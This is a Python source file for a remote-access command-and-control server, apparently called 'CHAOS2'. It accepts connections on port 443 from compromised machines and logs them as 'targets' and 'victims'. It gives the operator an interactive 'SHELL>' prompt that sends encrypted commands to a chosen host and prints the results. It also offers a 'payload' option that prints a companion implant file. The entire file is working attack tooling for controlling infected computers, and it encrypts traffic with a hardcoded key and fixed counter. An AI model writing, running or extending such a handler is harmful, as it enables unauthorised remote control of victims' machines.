import socket
import threading
import json
import sys
import signal
from Crypto.Cipher import AES


conn_list={}
counter = b"H"*16
key = b"H"*32



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 


def server():
    global conn_list
    global PORT
    HOST = ''
    PORT = 443
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)

    while True:
        conn, addr = s.accept()
        mac=""
        if conn:
            mac=decrypt(conn.recv(4098)).decode('utf-8')
            if mac:
                if mac in conn_list:
                    print(bcolors.OKGREEN,"\n[*] Target Online:{}".format(mac))
                else:
                    print(bcolors.OKBLUE,"\n[+] New Target Added:{}".format(mac))
                    conn_list[mac]=conn

def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}".format(count,key))
    else:
        print(bcolors.FAIL,"\n[*] List is empty")



def trigger():
    global conn_list
    interaction=int(input("[*] Interact with:-"))
    if interaction:
        if conn_list:
            if interaction<=len(conn_list):
                #print(conn_list)
                console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
        else:
            print(bcolors.FAIL,"\nNo connections")

def console(conn,bot,socket_target):
    print("\n====Target::({})====".format(bot))

    while True:
        commands=input("SHELL> ")
        a={bot:commands}
        if commands=='exit':
            return 0
        else:
            commands = bytes(commands, 'utf-8')
            conn.sendall(encrypt(commands)) # Otherwise we will send the command to the target
            out=decrypt(conn.recv(64000)).decode('utf-8') # and print the result that we got back
            print(out)
           # if out=="Dead":
            #    print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
            #    del conn_list[socket_target]
            #    return 0
            #else:
                #print(out)


def generatePayload():
    print("[*] Let's generate payloadz")
    #option=input("LHOST> ")
    # Read payload file, and replace host variable 
    f = open("payload.py", "r")
    for line in f:
        print(line)
    f.close()

def banner():
    print("")
    print(" ██████╗██╗  ██╗ █████╗  ██████╗ ███████╗██████╗ ")
    print("██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔════╝╚════██╗")
    print("██║     ███████║███████║██║   ██║███████╗ █████╔╝")
    print("██║     ██╔══██║██╔══██║██║   ██║╚════██║██╔═══╝ ")
    print("╚██████╗██║  ██║██║  ██║╚██████╔╝███████║███████╗")
    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")                             

def main():
    banner()
    threading.Thread(target=server).start()
    print(bcolors.HEADER,"\n[*] Server Started - Listening on port: " + str(PORT))
    print("[*] Type help or ? for options")
    while True:
        print(bcolors.ENDC)
        choice=input("CHAOS2> ")
        choice.replace(" ", "")
        if choice=='hosts' or choice =='h':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice =='interact' or choice =='i':
            p=threading.Thread(target=trigger)
            p.start()
            p.join()
        elif choice =='help' or choice =='?':
            print(bcolors.HEADER,"\n==========\n[+] hosts or h (To check for available victims online)\n[+] interact or i (To interact with a target)\n==========")
        elif choice =='payload':
            generatePayload()
        else:
            pass


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    main()
except:
    print(bcolors.HEADER," \n[!] ooof bye :(")
    






